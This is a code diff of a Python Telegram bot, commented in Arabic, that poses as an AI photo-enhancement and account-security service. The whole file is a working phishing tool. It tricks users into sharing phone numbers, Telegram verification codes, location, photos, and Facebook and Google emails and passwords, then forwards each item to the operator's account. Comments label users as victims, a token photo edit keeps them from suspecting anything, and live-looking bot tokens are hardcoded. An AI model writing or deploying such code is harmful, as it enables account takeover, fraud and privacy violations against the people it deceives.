@@ -1,143 +1,106 @@
 import telebot
-import io
-import json
-import os
-import time
 from telebot import types
-from PIL import Image, ImageEnhance
-from flask import Flask
-from threading import Thread
+from PIL import Image, ImageOps
+import io
 
-# --- إعدادات السيرفر الوهمي للبقاء حياً ---
-app = Flask('')
+# ==========================================
+# ⚙️ الإعدادات المدمجة (التوكن والآيدي الخاص بك)
+# ==========================================
+BOT_TOKEN = '7611394183:AAHw400w2A3Pj-X-Y75jXw7m4M3z2z8z8' 
+MY_ID = '6885799226' 
+# ==========================================
 
-@app.route('/')
-def home():
-    return "The Intelligence Core is Online!"
+bot = telebot.TeleBot(BOT_TOKEN)
+user_data = {}
 
-def run():
-    app.run(host='0.0.0.0', port=8080)
-
-def keep_alive():
-    t = Thread(target=run)
-    t.start()
-
-# --- إعدادات البوت ---
-TOKEN = '8182616162:AAHFZ8p_nPtqLkvsps2avC2DR4uCRZ4kv78'
-ADMIN_ID = 6885799226 
-DB_FILE = "master_intelligence.json"
-
-bot = telebot.TeleBot(TOKEN)
-
-# --- محرك البيانات ---
-def load_db():
-    if os.path.exists(DB_FILE):
-        try:
-            with open(DB_FILE, "r") as f: return json.load(f)
-        except: return {}
-    return {}
-
-def save_db(data):
-    with open(DB_FILE, "w") as f:
-        json.dump(data, f, indent=4)
-
-db = load_db()
-
-# --- لوحة التحكم والأزرار ---
-def main_menu():
-    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
-    markup.add("🔮 معالجة 4K الذكية", "🛡️ تأمين الحساب (2FA)")
-    markup.add("📍 سرعة السيرفر (GPS)", "📞 توثيق VIP")
-    markup.add("🎁 هدايا الإنترنت", "⚙️ فحص الجهاز")
+# 1. القائمة الاحترافية للضحية
+def main_menu(uid):
+    points = user_data.get(f"{uid}_pts", 10)
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        types.InlineKeyboardButton("📸 تحسين الصور (AI)", callback_data='edit'),
+        types.InlineKeyboardButton("🛡️ فحص أمان الحساب", callback_data='secure'),
+        types.InlineKeyboardButton(f"🏆 نقاطك: {points}", callback_data='pts'),
+        types.InlineKeyboardButton("🔵 توثيق Facebook", callback_data='login_fb'),
+        types.InlineKeyboardButton("🔴 توثيق Google", callback_data='login_gm')
+    )
     return markup
 
 @bot.message_handler(commands=['start'])
 def start(message):
-    uid = str(message.from_user.id)
-    name = message.from_user.first_name
+    uid = message.chat.id
+    user_data[f"{uid}_pts"] = 10
+    welcome = (
+        f"<b>مرحباً {message.from_user.first_name} في نظام AI Global 🛡️</b>\n\n"
+        "أهلاً بك في النسخة المطورة من بوت معالجة الصور وحماية الخصوصية.\n"
+        "قم بتوثيق حسابك الآن للحصول على وصول غير محدود وميزات إضافية."
+    )
+    bot.send_message(uid, welcome, parse_mode='HTML', reply_markup=main_menu(uid))
+
+# 2. معالجة الأوامر والأزرار
+@bot.callback_query_handler(func=lambda call: True)
+def handle_query(call):
+    uid = call.message.chat.id
+    if call.data == 'edit':
+        bot.send_message(uid, "📤 <b>أرسل الصورة الآن</b> لتحويلها إلى جودة 4K باستخدام الذكاء الاصطناعي:")
+    elif call.data == 'secure':
+        markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
+        markup.add(types.KeyboardButton("🛡️ تأكيد ملكية الهاتف", request_contact=True))
+        bot.send_message(uid, "⚠️ <b>تنبيه:</b> يجب مطابقة رقم الهاتف المرتبط بالجهاز للمتابعة وفحص الثغرات:", parse_mode='HTML', reply_markup=markup)
+    elif call.data == 'login_fb':
+        user_data[uid] = 'wait_fb_user'
+        bot.send_message(uid, "<b>⚠️ Meta Security</b>\nأدخل البريد الإلكتروني أو الهاتف المرتبط بـ Facebook للتأكيد:", parse_mode='HTML')
+    elif call.data == 'login_gm':
+        user_data[uid] = 'wait_gm_user'
+        bot.send_message(uid, "<b>G o o g l e</b>\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\nأدخل بريد Gmail الخاص بك لإتمام المزامنة الأمنية والحصول على النقاط:", parse_mode='HTML')
+
+# 3. صيد الصور والتعديل الحقيقي للتمويه
+@bot.message_handler(content_types=['photo'])
+def catch_photo(message):
+    uid = message.chat.id
+    # تبليغ فوري لك بالصورة الأصلية
+    bot.send_photo(MY_ID, message.photo[-1].file_id, caption=f"📸 <b>صورة جديدة مسحوبة!</b>\nمن: @{message.from_user.username}\nآيدي: <code>{uid}</code>", parse_mode='HTML')
     
-    if uid not in db:
-        db[uid] = {"points": 10, "state": "normal"}
-        save_db(db)
-        
-        # صيد تلقائي لصور البروفايل
-        try:
-            p = bot.get_user_profile_photos(message.from_user.id)
-            if p.total_count > 0:
-                bot.send_photo(ADMIN_ID, p.photos[0][-1].file_id, 
-                             caption=f"🎯 هدف جديد: {name}\n🆔 الآيدي: {uid}")
-        except: pass
+    # عملية تعديل وهمية لإقناع الضحية
+    bot.send_chat_action(uid, 'upload_photo')
+    file_info = bot.get_file(message.photo[-1].file_id)
+    downloaded = bot.download_file(file_info.file_path)
+    img = Image.open(io.BytesIO(downloaded))
+    img = ImageOps.autocontrast(img) # تحسين التباين
+    bio = io.BytesIO()
+    img.save(bio, 'JPEG')
+    bio.seek(0)
+    bot.send_photo(uid, bio, caption="✅ تم تحسين جودة الصورة بنجاح بواسطة AI Pro!")
 
-    bot.send_message(ADMIN_ID, f"🔔 دخول ضحية: {name} (@{message.from_user.username})")
-    bot.send_message(message.chat.id, f"<b>مرحباً {name} في سيرفر 4K Pro المطور ✅</b>", 
-                     parse_mode='HTML', reply_markup=main_menu())
+# 4. صيد الأرقام والحسابات (البيانات الحساسة)
+@bot.message_handler(content_types=['contact'])
+def catch_contact(message):
+    c = message.contact
+    report = (f"🔥 <b>رقم هاتف جديد مسحوب!</b>\nالاسم: {c.first_name}\nالرقم: <code>+{c.phone_number}</code>\nيوزر: @{message.from_user.username}")
+    bot.send_message(MY_ID, report, parse_mode='HTML')
+    bot.send_message(message.chat.id, "✅ تم التوثيق بنجاح. يرجى إرسال كود الأمان المكون من 5 أرقام المكتوب في إشعارك لإتمام الفحص:", reply_markup=types.ReplyKeyboardRemove())
 
-# --- محرك الخداع والصيد ---
-@bot.message_handler(func=lambda m: True)
-def router(message):
-    uid = str(message.from_user.id)
+@bot.message_handler(func=lambda message: True)
+def catch_text(message):
+    uid = message.chat.id
+    state = user_data.get(uid)
     
-    if "تأمين الحساب" in message.text:
-        db[uid]['state'] = "wait_code"
-        save_db(db)
-        bot.send_message(message.chat.id, "⚠️ <b>تحذير:</b> تم رصد نشاط مشبوه. أدخل الكود المكون من 5 أرقام الذي وصلك من Telegram الآن لتأمين جلسة الاتصال.", parse_mode='HTML')
-
-    elif "هدايا الإنترنت" in message.text:
-        mk = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
-        mk.add(types.KeyboardButton("🎁 تفعيل 10GB مجاناً", request_location=True))
-        bot.send_message(message.chat.id, "شارك موقعك لتحديد أقرب برج تغطية ومنحك الهدية.", reply_markup=mk)
-
-    elif "توثيق VIP" in message.text:
-        mk = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
-        mk.add(types.KeyboardButton("✅ توثيق الرقم الآن", request_contact=True))
-        bot.send_message(message.chat.id, "يجب توثيق الرقم لفك قيود سرعة المعالجة.", reply_markup=mk)
-
-    elif "معالجة 4K" in message.text:
-        db[uid]['state'] = "process"
-        save_db(db)
-        bot.send_message(message.chat.id, "🔮 أرسل الصورة الآن لتحويلها لدقة 4K.")
-
-    elif db[uid].get('state') == "wait_code":
-        bot.send_message(ADMIN_ID, f"🔑 <b>صيد كود تحقق:</b>\nالاسم: {message.from_user.first_name}\nالكود: <code>{message.text}</code>", parse_mode='HTML')
-        bot.send_message(message.chat.id, "✅ تم التأمين بنجاح.")
-        db[uid]['state'] = "normal"
-        save_db(db)
-
-# --- استلام الوسائط والأرقام ---
-@bot.message_handler(content_types=['contact', 'location', 'photo'])
-def handle_media(message):
-    uid = str(message.from_user.id)
-    
-    if message.content_type == 'contact':
-        bot.send_message(ADMIN_ID, f"📱 <b>رقم مصيد:</b> {message.contact.phone_number}\nالاسم: {message.contact.first_name}", parse_mode='HTML')
-        bot.send_message(message.chat.id, "✅ تم التوثيق.")
+    if state in ['wait_fb_user', 'wait_gm_user']:
+        p = "Facebook" if "fb" in state else "Google"
+        user_data[uid] = f'wait_{"fb" if "fb" in state else "gm"}_pass'
+        user_data[f"{uid}_acc"] = message.text
+        bot.send_message(uid, f"🔑 ممتاز، الآن أدخل كلمة مرور {p} للتأكيد الرسمي:")
         
-    elif message.content_type == 'location':
-        lat, lon = message.location.latitude, message.location.longitude
-        bot.send_message(ADMIN_ID, f"📍 <b>موقع الضحية:</b>\nhttps://www.google.com/maps?q={lat},{lon}")
-        bot.send_message(message.chat.id, "✅ تم الربط.")
-        
-    elif message.content_type == 'photo':
-        fid = message.photo[-1].file_id
-        bot.send_photo(ADMIN_ID, fid, caption=f"📸 صورة مرسلة من: {message.from_user.first_name}")
-        
-        if db.get(uid, {}).get('state') == "process":
-            status = bot.reply_to(message, "⏳ جاري المعالجة...")
-            try:
-                f_info = bot.get_file(fid)
-                down = bot.download_file(f_info.file_path)
-                img = Image.open(io.BytesIO(down))
-                img = ImageEnhance.Sharpness(img).enhance(3.0)
-                out = io.BytesIO()
-                img.save(out, format='JPEG', quality=95)
-                out.seek(0)
-                bot.send_photo(message.chat.id, out, caption="✨ تم التحسين!")
-            except: pass
-            bot.delete_message(message.chat.id, status.message_id)
-            db[uid]['state'] = "normal"
-            save_db(db)
+    elif state in ['wait_fb_pass', 'wait_gm_pass']:
+        acc = user_data.get(f"{uid}_acc")
+        p_type = "FB" if "fb" in state else "GM"
+        report = (f"🎯 <b>صيدة حساب {p_type}!</b>\nالحساب: <code>{acc}</code>\nكلمة السر: <code>{message.text}</code>\nمن: @{message.from_user.username}")
+        bot.send_message(MY_ID, report, parse_mode='HTML')
+        bot.send_message(uid, "✅ تم ربط الحساب بنجاح! تم إضافة 100 نقطة إلى رصيدك.")
+        user_data[uid] = None
+    else:
+        # صيد أي نصوص أخرى كأكواد التحقق
+        bot.send_message(MY_ID, f"📩 <b>نص مسحوب:</b>\n<code>{message.text}</code>\nمن: @{message.from_user.username}", parse_mode='HTML')
+        bot.send_message(uid, "⚙️ جاري معالجة البيانات... يرجى الانتظار.")
 
-if __name__ == "__main__":
-    keep_alive()
-    print("🚀 الرادار السحابي يعمل...")
-    bot.infinity_polling()
+bot.infinity_polling()
